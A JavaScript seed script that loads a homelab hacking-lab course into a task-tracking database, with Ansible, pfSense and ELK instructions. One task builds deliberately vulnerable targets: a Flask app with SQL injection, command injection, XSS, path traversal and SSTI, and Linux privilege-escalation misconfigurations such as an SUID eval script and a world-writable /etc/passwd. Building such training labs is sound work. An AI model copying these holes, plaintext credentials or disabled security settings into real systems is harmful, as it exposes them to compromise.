import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// COMPLETE HOMELAB AUTOMATION
// ============================================================================
const labPath = insertPath.run(
	'Complete Homelab Infrastructure',
	'Full automation scripts for building a professional hacking lab. Includes Ansible playbooks, pfSense configuration, DNS/DHCP, C2 setup, logging, and lab management.',
	'emerald',
	now
);

// Module 1: Infrastructure Automation with Ansible
const mod1 = insertModule.run(labPath.lastInsertRowid, 'Ansible Lab Automation', 'Complete Ansible playbooks for automated lab deployment', 0, now);

insertTask.run(mod1.lastInsertRowid, 'Set up Ansible control node', 'Install Ansible on a dedicated control machine, configure SSH key authentication to managed hosts, set up inventory files with host groups, and install required collections for Windows and network device management', `## Ansible Control Node Setup

### Directory Structure
\`\`\`bash
mkdir -p ~/homelab/{inventory,playbooks,roles,files,templates,group_vars,host_vars}
cd ~/homelab

# Create the structure
cat > README.md << 'EOF'
# Homelab Infrastructure as Code

## Quick Start
1. Edit inventory/hosts.yml with your IPs
2. Run: ansible-playbook playbooks/site.yml

## Structure
- inventory/     - Host definitions
- playbooks/     - Main playbooks
- roles/         - Reusable roles
- group_vars/    - Group variables
- host_vars/     - Host-specific vars
- files/         - Static files
- templates/     - Jinja2 templates
EOF
\`\`\`

### Ansible Configuration
\`\`\`ini
# ansible.cfg
[defaults]
inventory = inventory/hosts.yml
remote_user = root
host_key_checking = False
retry_files_enabled = False
gathering = smart
fact_caching = jsonfile
fact_caching_connection = /tmp/ansible_facts
fact_caching_timeout = 86400

[privilege_escalation]
become = True
become_method = sudo
become_user = root
become_ask_pass = False

[ssh_connection]
pipelining = True
ssh_args = -o ControlMaster=auto -o ControlPersist=60s
\`\`\`

### Inventory File
\`\`\`yaml
# inventory/hosts.yml
all:
  children:
    # Management Network (VLAN 10)
    management:
      hosts:
        proxmox:
          ansible_host: 10.10.10.2
        pfsense:
          ansible_host: 10.10.10.1

    # Attack Network (VLAN 20)
    attack:
      hosts:
        kali:
          ansible_host: 10.20.20.10
        c2-server:
          ansible_host: 10.20.20.20

    # Victim Network (VLAN 30)
    victims:
      hosts:
        dvwa:
          ansible_host: 10.30.30.10
        juiceshop:
          ansible_host: 10.30.30.11
        dc01:
          ansible_host: 10.30.30.100
          ansible_user: Administrator
          ansible_password: "{{ vault_dc_password }}"
          ansible_connection: winrm
          ansible_winrm_server_cert_validation: ignore
        ws01:
          ansible_host: 10.30.30.101
          ansible_user: Administrator
          ansible_connection: winrm
          ansible_winrm_server_cert_validation: ignore

    # Linux targets
    linux_targets:
      hosts:
        ubuntu-target:
          ansible_host: 10.30.30.50
        debian-target:
          ansible_host: 10.30.30.51

  vars:
    ansible_python_interpreter: /usr/bin/python3
    lab_domain: hacklab.local
    lab_network: 10.0.0.0/8
\`\`\`

### Group Variables
\`\`\`yaml
# group_vars/all.yml
---
# Lab Configuration
lab_name: "HackLab"
lab_domain: "hacklab.local"
timezone: "America/New_York"

# Network Configuration
networks:
  management:
    vlan: 10
    subnet: 10.10.10.0/24
    gateway: 10.10.10.1
  attack:
    vlan: 20
    subnet: 10.20.20.0/24
    gateway: 10.20.20.1
  victims:
    vlan: 30
    subnet: 10.30.30.0/24
    gateway: 10.30.30.1

# Common packages
common_packages:
  - curl
  - wget
  - git
  - vim
  - htop
  - net-tools
  - tcpdump

# DNS Settings
dns_servers:
  - 10.10.10.1
  - 8.8.8.8
\`\`\`

### Encrypted Secrets
\`\`\`bash
# Create vault password file
echo "your-vault-password" > ~/.vault_pass
chmod 600 ~/.vault_pass

# Create encrypted variables
ansible-vault create group_vars/vault.yml

# Contents of vault.yml:
# vault_dc_password: "P@ssw0rd123!"
# vault_kali_password: "kali"
# vault_root_password: "toor"
\`\`\`

### Test Connectivity
\`\`\`bash
# Test all hosts
ansible all -m ping

# Test specific group
ansible victims -m ping

# List all hosts
ansible-inventory --list
\`\`\``, 0, now);

insertTask.run(mod1.lastInsertRowid, 'Create master deployment playbook', 'Write an Ansible playbook that orchestrates complete lab deployment by importing role-specific playbooks in order, handling dependencies, and providing a single-command setup for the entire lab environment', `## Master Deployment Playbook

### Site Playbook (Main Entry Point)
\`\`\`yaml
# playbooks/site.yml
---
- name: Deploy Complete Hacking Lab
  hosts: localhost
  gather_facts: no
  tasks:
    - name: Display lab deployment banner
      debug:
        msg: |
          ╔══════════════════════════════════════════╗
          ║     HACKLAB INFRASTRUCTURE DEPLOYMENT    ║
          ╠══════════════════════════════════════════╣
          ║  This will deploy:                       ║
          ║  - Network infrastructure (pfSense)      ║
          ║  - Attack systems (Kali, C2)             ║
          ║  - Vulnerable targets                    ║
          ║  - Logging & monitoring                  ║
          ╚══════════════════════════════════════════╝

# Phase 1: Network Infrastructure
- import_playbook: network/pfsense.yml
  tags: [network, pfsense]

# Phase 2: Core Services
- import_playbook: services/dns.yml
  tags: [services, dns]

- import_playbook: services/logging.yml
  tags: [services, logging]

# Phase 3: Attack Infrastructure
- import_playbook: attack/kali.yml
  tags: [attack, kali]

- import_playbook: attack/c2.yml
  tags: [attack, c2]

# Phase 4: Vulnerable Targets
- import_playbook: victims/web-apps.yml
  tags: [victims, web]

- import_playbook: victims/linux-targets.yml
  tags: [victims, linux]

- import_playbook: victims/windows-ad.yml
  tags: [victims, windows, ad]

# Phase 5: Final Configuration
- import_playbook: finalize.yml
  tags: [finalize]
\`\`\`

### Kali Attack Box Playbook
\`\`\`yaml
# playbooks/attack/kali.yml
---
- name: Configure Kali Attack Box
  hosts: kali
  become: yes
  vars:
    tools_dir: /opt/tools
    wordlists_dir: /usr/share/wordlists

  tasks:
    - name: Update apt cache
      apt:
        update_cache: yes
        cache_valid_time: 3600

    - name: Upgrade all packages
      apt:
        upgrade: dist
      async: 3600
      poll: 30

    - name: Install essential packages
      apt:
        name:
          # Reconnaissance
          - nmap
          - masscan
          - amass
          - subfinder
          - httpx-toolkit
          # Web
          - gobuster
          - feroxbuster
          - ffuf
          - sqlmap
          - burpsuite
          # Exploitation
          - metasploit-framework
          - exploitdb
          - searchsploit
          # Post-exploitation
          - evil-winrm
          - crackmapexec
          - impacket-scripts
          - bloodhound
          - neo4j
          # Password attacks
          - john
          - hashcat
          - hydra
          # Networking
          - chisel
          - proxychains4
          - sshuttle
          # Development
          - python3-pip
          - python3-venv
          - golang
          - rustc
          - cargo
          # Utilities
          - tmux
          - jq
          - tree
          - rlwrap
        state: present

    - name: Create tools directory
      file:
        path: "{{ tools_dir }}"
        state: directory
        mode: '0755'

    - name: Clone essential Git repositories
      git:
        repo: "{{ item.repo }}"
        dest: "{{ tools_dir }}/{{ item.name }}"
        force: yes
      loop:
        - { name: "LinPEAS", repo: "https://github.com/carlospolop/PEASS-ng.git" }
        - { name: "pspy", repo: "https://github.com/DominicBreuker/pspy.git" }
        - { name: "PowerSploit", repo: "https://github.com/PowerShellMafia/PowerSploit.git" }
        - { name: "Nishang", repo: "https://github.com/samratashok/nishang.git" }
        - { name: "SecLists", repo: "https://github.com/danielmiessler/SecLists.git" }
        - { name: "PayloadsAllTheThings", repo: "https://github.com/swisskyrepo/PayloadsAllTheThings.git" }
        - { name: "SharpCollection", repo: "https://github.com/Flangvik/SharpCollection.git" }

    - name: Install Python tools
      pip:
        name:
          - pwntools
          - requests
          - beautifulsoup4
          - impacket
          - bloodhound
          - certipy-ad
          - pycryptodome
          - paramiko
        executable: pip3

    - name: Install Go tools
      shell: |
        export GOPATH=/root/go
        export PATH=\$PATH:/root/go/bin
        go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
        go install github.com/projectdiscovery/httpx/cmd/httpx@latest
        go install github.com/tomnomnom/assetfinder@latest
        go install github.com/ffuf/ffuf@latest
      args:
        creates: /root/go/bin/nuclei

    - name: Configure tmux
      copy:
        dest: /root/.tmux.conf
        content: |
          set -g mouse on
          set -g history-limit 50000
          set -g default-terminal "screen-256color"
          unbind C-b
          set -g prefix C-a
          bind C-a send-prefix
          bind | split-window -h -c "#{pane_current_path}"
          bind - split-window -v -c "#{pane_current_path}"
          bind h select-pane -L
          bind j select-pane -D
          bind k select-pane -U
          bind l select-pane -R

    - name: Create workspace structure
      file:
        path: "/root/htb/{{ item }}"
        state: directory
      loop:
        - machines
        - tools
        - scripts
        - notes
        - loot

    - name: Set up aliases
      blockinfile:
        path: /root/.bashrc
        block: |
          # HackLab Aliases
          alias ll='ls -la'
          alias targets='cat /etc/hosts | grep 10.30'
          alias serve='python3 -m http.server 80'
          alias listen='rlwrap nc -lvnp'
          alias scan='nmap -sCV -oA scan'
          alias quick='nmap -sV --top-ports 100'

          # Tool shortcuts
          alias linpeas='cat /opt/tools/LinPEAS/linPEAS/linpeas.sh'
          alias winpeas='cat /opt/tools/LinPEAS/winPEAS/winPEASany.exe'

          export PATH=\$PATH:/root/go/bin

    - name: Configure /etc/hosts for lab
      lineinfile:
        path: /etc/hosts
        line: "{{ item }}"
      loop:
        - "10.30.30.10  dvwa.hacklab.local dvwa"
        - "10.30.30.11  juiceshop.hacklab.local juiceshop"
        - "10.30.30.100 dc01.hacklab.local dc01"
        - "10.30.30.101 ws01.hacklab.local ws01"
\`\`\`

### Run Specific Playbooks
\`\`\`bash
# Deploy everything
ansible-playbook playbooks/site.yml

# Deploy only Kali
ansible-playbook playbooks/site.yml --tags kali

# Deploy only victims
ansible-playbook playbooks/site.yml --tags victims

# Deploy with verbose output
ansible-playbook playbooks/site.yml -vvv

# Check mode (dry run)
ansible-playbook playbooks/site.yml --check
\`\`\``, 1, now);

insertTask.run(mod1.lastInsertRowid, 'Create vulnerable target playbooks', 'Develop Ansible playbooks to deploy intentionally vulnerable machines including DVWA, Metasploitable, and custom Windows targets with specific CVEs for practicing exploitation techniques in an isolated lab', `## Vulnerable Target Playbooks

### Web Applications Playbook
\`\`\`yaml
# playbooks/victims/web-apps.yml
---
- name: Deploy Vulnerable Web Applications
  hosts: localhost
  connection: local
  vars:
    docker_network: vuln-net
    apps_dir: /opt/vulnerable-apps

  tasks:
    - name: Create apps directory
      file:
        path: "{{ apps_dir }}"
        state: directory

    - name: Create Docker network
      docker_network:
        name: "{{ docker_network }}"
        ipam_config:
          - subnet: 172.28.0.0/16

    - name: Deploy DVWA
      docker_container:
        name: dvwa
        image: vulnerables/web-dvwa
        state: started
        restart_policy: unless-stopped
        networks:
          - name: "{{ docker_network }}"
        ports:
          - "10.30.30.10:80:80"

    - name: Deploy OWASP Juice Shop
      docker_container:
        name: juiceshop
        image: bkimminich/juice-shop
        state: started
        restart_policy: unless-stopped
        networks:
          - name: "{{ docker_network }}"
        ports:
          - "10.30.30.11:80:3000"

    - name: Deploy WebGoat
      docker_container:
        name: webgoat
        image: webgoat/webgoat
        state: started
        restart_policy: unless-stopped
        networks:
          - name: "{{ docker_network }}"
        ports:
          - "10.30.30.12:8080:8080"
          - "10.30.30.12:9090:9090"

    - name: Deploy Mutillidae
      docker_container:
        name: mutillidae
        image: citizenstig/nowasp
        state: started
        restart_policy: unless-stopped
        networks:
          - name: "{{ docker_network }}"
        ports:
          - "10.30.30.13:80:80"

    - name: Create custom vulnerable Flask app
      copy:
        dest: "{{ apps_dir }}/vuln-flask/app.py"
        content: |
          from flask import Flask, request, render_template_string
          import sqlite3, subprocess, os

          app = Flask(__name__)

          def init_db():
              conn = sqlite3.connect('/tmp/users.db')
              c = conn.cursor()
              c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)')
              c.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'sup3rs3cr3t!', 'admin')")
              c.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'password123', 'user')")
              c.execute("INSERT OR IGNORE INTO users VALUES (3, 'guest', 'guest', 'guest')")
              conn.commit()
              conn.close()

          @app.route('/')
          def index():
              return '<h1>Vulnerable Corp</h1><a href="/login">Login</a> | <a href="/ping">Ping</a> | <a href="/search">Search</a>'

          @app.route('/login', methods=['GET', 'POST'])
          def login():
              if request.method == 'POST':
                  user = request.form.get('username', '')
                  passwd = request.form.get('password', '')
                  conn = sqlite3.connect('/tmp/users.db')
                  c = conn.cursor()
                  # VULN: SQL Injection
                  query = f"SELECT * FROM users WHERE username='{user}' AND password='{passwd}'"
                  try:
                      c.execute(query)
                      result = c.fetchone()
                      if result:
                          return f"<h1>Welcome {result[1]}!</h1><p>Role: {result[3]}</p>"
                      return "<h1>Invalid credentials</h1>"
                  except Exception as e:
                      return f"<h1>Error</h1><pre>{e}</pre><p>Query: {query}</p>"
              return '''<form method="post"><input name="username" placeholder="Username">
                  <input name="password" type="password" placeholder="Password">
                  <button>Login</button></form>'''

          @app.route('/ping')
          def ping():
              host = request.args.get('host', '127.0.0.1')
              # VULN: Command Injection
              output = subprocess.getoutput(f'ping -c 2 {host}')
              return f'<pre>{output}</pre><form><input name="host" value="{host}"><button>Ping</button></form>'

          @app.route('/search')
          def search():
              q = request.args.get('q', '')
              # VULN: XSS
              return f'<h1>Search Results for: {q}</h1><form><input name="q"><button>Search</button></form>'

          @app.route('/file')
          def readfile():
              f = request.args.get('name', 'welcome.txt')
              # VULN: Path Traversal
              try:
                  content = open(f'/app/files/{f}').read()
                  return f'<pre>{content}</pre>'
              except:
                  return 'File not found'

          @app.route('/template')
          def template():
              name = request.args.get('name', 'Guest')
              # VULN: SSTI
              return render_template_string(f'<h1>Hello {name}!</h1>')

          if __name__ == '__main__':
              init_db()
              os.makedirs('/app/files', exist_ok=True)
              open('/app/files/welcome.txt', 'w').write('Welcome to Vulnerable Corp!')
              app.run(host='0.0.0.0', port=5000, debug=True)

    - name: Create Dockerfile for custom app
      copy:
        dest: "{{ apps_dir }}/vuln-flask/Dockerfile"
        content: |
          FROM python:3.9-slim
          RUN pip install flask
          COPY app.py /app/app.py
          WORKDIR /app
          EXPOSE 5000
          CMD ["python", "app.py"]

    - name: Build custom vulnerable app
      docker_image:
        name: vuln-flask
        build:
          path: "{{ apps_dir }}/vuln-flask"
        source: build

    - name: Deploy custom vulnerable app
      docker_container:
        name: vuln-flask
        image: vuln-flask
        state: started
        restart_policy: unless-stopped
        networks:
          - name: "{{ docker_network }}"
        ports:
          - "10.30.30.20:80:5000"
\`\`\`

### Linux Privilege Escalation Targets
\`\`\`yaml
# playbooks/victims/linux-targets.yml
---
- name: Deploy Linux Privilege Escalation Targets
  hosts: linux_targets
  become: yes
  vars:
    vuln_users:
      - { name: "lowpriv", password: "lowpriv123", shell: "/bin/bash" }
      - { name: "developer", password: "dev123", shell: "/bin/bash" }

  tasks:
    - name: Create vulnerable users
      user:
        name: "{{ item.name }}"
        password: "{{ item.password | password_hash('sha512') }}"
        shell: "{{ item.shell }}"
        groups: users
      loop: "{{ vuln_users }}"

    # SUID Binary Vulnerabilities
    - name: Create SUID vulnerable binary
      copy:
        dest: /usr/local/bin/vuln-suid
        content: |
          #!/bin/bash
          # Vulnerable: runs commands as root
          eval \$1
        mode: '4755'
        owner: root

    - name: Set SUID on common binaries (for practice)
      file:
        path: "{{ item }}"
        mode: '4755'
      loop:
        - /usr/bin/find
        - /usr/bin/vim.basic
      ignore_errors: yes

    # Sudo Misconfigurations
    - name: Create vulnerable sudo rules
      copy:
        dest: /etc/sudoers.d/vulnerable
        content: |
          # Vulnerable sudo configurations
          lowpriv ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/*
          lowpriv ALL=(ALL) NOPASSWD: /usr/bin/awk
          developer ALL=(ALL) NOPASSWD: /usr/bin/env
          developer ALL=(root) NOPASSWD: /opt/scripts/*.sh
        validate: 'visudo -cf %s'

    - name: Create sudo target scripts directory
      file:
        path: /opt/scripts
        state: directory
        mode: '0755'

    - name: Create writable script (path hijack)
      copy:
        dest: /opt/scripts/backup.sh
        content: |
          #!/bin/bash
          tar -czf /tmp/backup.tar.gz /home
        mode: '0777'

    # Cron Job Vulnerabilities
    - name: Create vulnerable cron job
      copy:
        dest: /etc/cron.d/vulnerable
        content: |
          # Runs as root every minute
          * * * * * root /opt/scripts/cleanup.sh
        mode: '0644'

    - name: Create writable cron script
      copy:
        dest: /opt/scripts/cleanup.sh
        content: |
          #!/bin/bash
          rm -rf /tmp/old_*
        mode: '0777'

    # Writable /etc/passwd
    - name: Make passwd writable (dangerous but for practice)
      file:
        path: /etc/passwd
        mode: '0666'
      when: "'training' in group_names"

    # Credentials in files
    - name: Create file with credentials
      copy:
        dest: /opt/.db_credentials
        content: |
          DB_USER=admin
          DB_PASS=Sup3rS3cr3tP@ss!
          DB_HOST=localhost
        mode: '0644'

    - name: Create MySQL history with creds
      copy:
        dest: /home/developer/.mysql_history
        content: |
          connect database -u root -pMySQLR00tP@ss
          SELECT * FROM users;
        owner: developer
        mode: '0644'

    # SSH Key with weak permissions
    - name: Create SSH private key with bad perms
      copy:
        dest: /opt/backup/id_rsa
        content: |
          -----BEGIN OPENSSH PRIVATE KEY-----
          b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
          NhAAAAAwEAAQAAAYEA... (truncated - generate real key for lab)
          -----END OPENSSH PRIVATE KEY-----
        mode: '0644'

    # Capability-based privesc
    - name: Set capabilities on python
      capabilities:
        path: /usr/bin/python3.9
        capability: cap_setuid+ep
        state: present
      ignore_errors: yes

    # NFS with no_root_squash
    - name: Configure vulnerable NFS export
      lineinfile:
        path: /etc/exports
        line: "/home *(rw,sync,no_root_squash)"
        create: yes
      notify: restart nfs

    # Writable PATH directory
    - name: Create writable path directory
      file:
        path: /usr/local/custom/bin
        state: directory
        mode: '0777'

    - name: Add writable dir to PATH in profile
      lineinfile:
        path: /etc/profile
        line: 'export PATH=/usr/local/custom/bin:\$PATH'

    # Docker group membership (if docker installed)
    - name: Add user to docker group
      user:
        name: lowpriv
        groups: docker
        append: yes
      ignore_errors: yes

  handlers:
    - name: restart nfs
      service:
        name: nfs-kernel-server
        state: restarted
\`\`\`

### Target Summary File
\`\`\`yaml
# After deployment, generate target list
- name: Generate target summary
  hosts: localhost
  tasks:
    - name: Create target cheatsheet
      copy:
        dest: /root/TARGETS.md
        content: |
          # Lab Targets Cheatsheet

          ## Web Applications (10.30.30.x)
          | IP | Name | Vulns |
          |----|------|-------|
          | 10.30.30.10 | DVWA | SQLi, XSS, CSRF, LFI |
          | 10.30.30.11 | Juice Shop | OWASP Top 10 |
          | 10.30.30.12 | WebGoat | Training platform |
          | 10.30.30.13 | Mutillidae | OWASP Top 10 |
          | 10.30.30.20 | VulnFlask | SQLi, RCE, XSS, SSTI, LFI |

          ## Linux Privesc (10.30.30.5x)
          | IP | User:Pass | Techniques |
          |----|-----------|------------|
          | 10.30.30.50 | lowpriv:lowpriv123 | SUID, Sudo, Cron |
          | 10.30.30.51 | developer:dev123 | Caps, Docker, Path |

          ## Windows AD (10.30.30.10x)
          | IP | Role | Attacks |
          |----|------|---------|
          | 10.30.30.100 | DC01 | Kerberoast, DCSync |
          | 10.30.30.101 | WS01 | Local admin, Mimikatz |
\`\`\``, 2, now);

// Module 2: pfSense Firewall Configuration
const mod2 = insertModule.run(labPath.lastInsertRowid, 'pfSense Firewall Setup', 'Complete pfSense configuration for lab segmentation', 1, now);

insertTask.run(mod2.lastInsertRowid, 'Install and configure pfSense', 'Install pfSense on dedicated hardware or VM, configure WAN/LAN interfaces, set up DHCP, create firewall rules for lab network segmentation, and enable logging for traffic analysis and intrusion detection', `## pfSense Installation & Configuration

### Hardware/VM Requirements
\`\`\`
Minimum:
- 2 CPU cores
- 2GB RAM
- 8GB disk
- 3 network interfaces:
  - WAN (home network)
  - LAN (management)
  - OPT1-3 (VLANs for attack/victim networks)
\`\`\`

### Proxmox VM Creation
\`\`\`bash
# Download pfSense ISO
wget https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.7.0-RELEASE-amd64.iso.gz
gunzip pfSense-CE-2.7.0-RELEASE-amd64.iso.gz

# Create VM in Proxmox
qm create 100 --name pfsense --memory 2048 --cores 2 \\
  --net0 virtio,bridge=vmbr0 \\
  --net1 virtio,bridge=vmbr1 \\
  --net2 virtio,bridge=vmbr2 \\
  --net3 virtio,bridge=vmbr3 \\
  --cdrom local:iso/pfSense-CE-2.7.0-RELEASE-amd64.iso \\
  --scsihw virtio-scsi-pci \\
  --scsi0 local-lvm:16

qm start 100
\`\`\`

### Initial Setup Wizard
\`\`\`
1. Boot and install pfSense
2. Assign interfaces:
   - WAN = vtnet0 (192.168.1.x from home router)
   - LAN = vtnet1 (10.10.10.1/24 - Management)
   - OPT1 = vtnet2 (10.20.20.1/24 - Attack)
   - OPT2 = vtnet3 (10.30.30.1/24 - Victims)

3. Access WebGUI: https://10.10.10.1
   Default: admin / pfsense

4. Complete wizard:
   - Hostname: pfsense
   - Domain: hacklab.local
   - DNS: 8.8.8.8, 8.8.4.4
   - Timezone: Your timezone
   - Change admin password!
\`\`\`

### Interface Configuration Script
\`\`\`xml
<!-- Export this config and import via Diagnostics > Backup -->
<!-- Or configure manually in WebGUI -->

<!-- Interfaces > OPT1 (Attack Network) -->
<opt1>
  <enable>1</enable>
  <descr>ATTACK</descr>
  <ipaddr>10.20.20.1</ipaddr>
  <subnet>24</subnet>
</opt1>

<!-- Interfaces > OPT2 (Victim Network) -->
<opt2>
  <enable>1</enable>
  <descr>VICTIMS</descr>
  <ipaddr>10.30.30.1</ipaddr>
  <subnet>24</subnet>
</opt2>
\`\`\`

### DHCP Server Configuration
\`\`\`
For each interface (LAN, ATTACK, VICTIMS):

Services > DHCP Server > [Interface]

LAN (Management):
  Range: 10.10.10.100 - 10.10.10.200
  DNS: 10.10.10.1
  Gateway: 10.10.10.1

ATTACK:
  Range: 10.20.20.100 - 10.20.20.200
  DNS: 10.10.10.1 (or 8.8.8.8)
  Gateway: 10.20.20.1

VICTIMS:
  Range: 10.30.30.100 - 10.30.30.200
  DNS: 10.10.10.1
  Gateway: 10.30.30.1
\`\`\`

### DNS Resolver Configuration
\`\`\`
Services > DNS Resolver

Enable DNS Resolver: ✓
Network Interfaces: All
Outgoing Network Interfaces: WAN

Host Overrides:
  Host: dc01, Domain: hacklab.local, IP: 10.30.30.100
  Host: ws01, Domain: hacklab.local, IP: 10.30.30.101
  Host: kali, Domain: hacklab.local, IP: 10.20.20.10
  Host: dvwa, Domain: hacklab.local, IP: 10.30.30.10
  Host: juiceshop, Domain: hacklab.local, IP: 10.30.30.11
\`\`\``, 0, now);

insertTask.run(mod2.lastInsertRowid, 'Configure firewall rules for lab segmentation', 'Create pfSense firewall rules to isolate attack networks from production, permit specific traffic flows between lab segments, block internet access from vulnerable targets, and log all cross-segment traffic for analysis', `## pfSense Firewall Rules

### Rule Strategy
\`\`\`
Management (LAN): Full access everywhere (admin network)
Attack: Can reach Victims, limited internet
Victims: Isolated - no outbound, no cross-talk
\`\`\`

### LAN Rules (Management Network)
\`\`\`
Firewall > Rules > LAN

Rule 1: Allow Management Full Access
  Action: Pass
  Interface: LAN
  Protocol: Any
  Source: LAN net
  Destination: Any
  Description: Allow management network full access

Rule 2: Allow Anti-Lockout (auto-created)
  Action: Pass
  Interface: LAN
  Protocol: TCP
  Source: Any
  Destination: LAN address, Port 443
  Description: Anti-lockout rule
\`\`\`

### ATTACK Rules (Attacker Network)
\`\`\`
Firewall > Rules > ATTACK

Rule 1: Allow Attack to Victims
  Action: Pass
  Interface: ATTACK
  Protocol: Any
  Source: ATTACK net
  Destination: VICTIMS net
  Description: Allow attackers to reach victims

Rule 2: Allow Attack to Internet (HTTP/HTTPS)
  Action: Pass
  Interface: ATTACK
  Protocol: TCP
  Source: ATTACK net
  Destination: Any
  Dest Ports: 80, 443
  Description: Allow web access for tool downloads

Rule 3: Allow DNS
  Action: Pass
  Interface: ATTACK
  Protocol: TCP/UDP
  Source: ATTACK net
  Destination: Any
  Dest Port: 53
  Description: Allow DNS resolution

Rule 4: Block Attack to Management
  Action: Block
  Interface: ATTACK
  Protocol: Any
  Source: ATTACK net
  Destination: LAN net
  Description: Isolate attack from management
\`\`\`

### VICTIMS Rules (Isolated Target Network)
\`\`\`
Firewall > Rules > VICTIMS

Rule 1: Allow Established Connections (Response to attacks)
  Action: Pass
  Interface: VICTIMS
  Protocol: Any
  Source: VICTIMS net
  Destination: ATTACK net
  State: Established/Related only
  Description: Allow responses to attackers

Rule 2: Block All Outbound
  Action: Block
  Interface: VICTIMS
  Protocol: Any
  Source: VICTIMS net
  Destination: Any
  Log: ✓
  Description: Block all victim-initiated traffic

(Default deny handles the rest)
\`\`\`

### NAT Configuration
\`\`\`
Firewall > NAT > Outbound

Mode: Hybrid Outbound NAT

Rules:
1. LAN to WAN - Auto-created
2. ATTACK to WAN - Auto-created (for internet access)
3. Do NOT create NAT for VICTIMS (keep isolated)
\`\`\`

### Port Forwarding (Optional - for external access)
\`\`\`
Firewall > NAT > Port Forward

# Forward Kali SSH from WAN
Interface: WAN
Protocol: TCP
Dest Port: 2222
Redirect Target IP: 10.20.20.10
Redirect Target Port: 22
Description: SSH to Kali

# Forward web target from WAN (for testing)
Interface: WAN
Protocol: TCP
Dest Port: 8080
Redirect Target IP: 10.30.30.10
Redirect Target Port: 80
Description: DVWA external access
\`\`\`

### Aliases (Simplify Rules)
\`\`\`
Firewall > Aliases

Name: Victims_WebApps
Type: Host(s)
Hosts: 10.30.30.10, 10.30.30.11, 10.30.30.12, 10.30.30.13, 10.30.30.20

Name: Victims_Windows
Type: Host(s)
Hosts: 10.30.30.100, 10.30.30.101

Name: Web_Ports
Type: Ports
Ports: 80, 443, 8080, 8443, 3000

Name: Windows_Ports
Type: Ports
Ports: 135, 139, 445, 3389, 5985, 5986
\`\`\`

### Export Configuration
\`\`\`
# Backup your config!
Diagnostics > Backup & Restore > Download Configuration

# Save as: pfsense-hacklab-config.xml
# Store in your Git repo
\`\`\``, 1, now);

// Module 3: Logging and Monitoring
const mod3 = insertModule.run(labPath.lastInsertRowid, 'Logging & SIEM Setup', 'Deploy ELK stack for attack detection practice', 2, now);

insertTask.run(mod3.lastInsertRowid, 'Deploy ELK stack with Docker', 'Deploy Elasticsearch, Logstash, and Kibana using Docker Compose with persistent volumes, configure Logstash pipelines for parsing syslog and Windows events, and create Kibana dashboards for security monitoring', `## ELK Stack Deployment

### Docker Compose Configuration
\`\`\`yaml
# /opt/elk/docker-compose.yml
version: '3.8'

services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    container_name: elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms2g -Xmx2g"
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
    ports:
      - "9200:9200"
    networks:
      - elk
    healthcheck:
      test: curl -s http://localhost:9200 >/dev/null || exit 1
      interval: 30s
      timeout: 10s
      retries: 5

  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.0
    container_name: logstash
    volumes:
      - ./logstash/pipeline:/usr/share/logstash/pipeline:ro
      - ./logstash/config/logstash.yml:/usr/share/logstash/config/logstash.yml:ro
    ports:
      - "5044:5044"   # Beats
      - "5514:5514"   # Syslog
      - "9600:9600"   # API
    networks:
      - elk
    depends_on:
      - elasticsearch

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    container_name: kibana
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    networks:
      - elk
    depends_on:
      - elasticsearch

networks:
  elk:
    driver: bridge

volumes:
  elasticsearch-data:
\`\`\`

### Logstash Configuration
\`\`\`yaml
# /opt/elk/logstash/config/logstash.yml
http.host: "0.0.0.0"
xpack.monitoring.elasticsearch.hosts: ["http://elasticsearch:9200"]
\`\`\`

### Logstash Pipeline
\`\`\`ruby
# /opt/elk/logstash/pipeline/logstash.conf
input {
  # Syslog from pfSense and Linux hosts
  syslog {
    port => 5514
    type => "syslog"
  }

  # Beats input (Filebeat, Winlogbeat)
  beats {
    port => 5044
  }
}

filter {
  # Parse pfSense filterlog
  if [type] == "syslog" and [program] == "filterlog" {
    grok {
      match => { "message" => "%{GREEDYDATA:pfsense_log}" }
    }
  }

  # Parse Windows Security Events
  if [agent][type] == "winlogbeat" {
    if [winlog][channel] == "Security" {
      mutate {
        add_tag => ["windows_security"]
      }
    }
  }

  # GeoIP for external IPs
  if [source][ip] {
    geoip {
      source => "[source][ip]"
      target => "geoip"
    }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "%{[@metadata][beat]}-%{+YYYY.MM.dd}"
  }

  # Debug output
  # stdout { codec => rubydebug }
}
\`\`\`

### Deployment Script
\`\`\`bash
#!/bin/bash
# /opt/elk/deploy.sh

set -e

# Create directories
mkdir -p /opt/elk/{logstash/pipeline,logstash/config}

# Set permissions
chmod -R 755 /opt/elk

# Create config files (copy from above)
# ...

# Deploy stack
cd /opt/elk
docker-compose up -d

# Wait for Elasticsearch
echo "Waiting for Elasticsearch..."
until curl -s http://localhost:9200 > /dev/null; do
  sleep 5
done
echo "Elasticsearch is ready!"

# Wait for Kibana
echo "Waiting for Kibana..."
until curl -s http://localhost:5601 > /dev/null; do
  sleep 5
done
echo "Kibana is ready!"

echo ""
echo "=== ELK Stack Deployed ==="
echo "Elasticsearch: http://localhost:9200"
echo "Kibana:        http://localhost:5601"
echo "Logstash:      localhost:5044 (beats), localhost:5514 (syslog)"
\`\`\`

